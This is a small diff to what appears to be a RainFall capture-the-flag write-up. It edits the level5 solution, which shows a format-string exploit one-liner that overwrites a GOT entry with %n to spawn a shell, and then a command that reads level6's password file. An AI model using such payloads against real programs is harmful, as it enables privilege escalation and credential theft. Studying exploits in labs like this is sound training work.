@@ -124,5 +124,6 @@ Notes:
 level6@RainFall:/tmp$ exit
 exit
 level5@RainFall:~$ (python -c 'print "\x14\xa0\x04\x08" + "%134513856d%4$n"' ; cat -) | /home/user/level6/level5_source
-[You will find are in an infinite print loop. Paste 'cat /home/user/level6/.pass' and press 'enter']
+[... infinite print loop ...]
+cat /home/user/level6/.pass
 ```
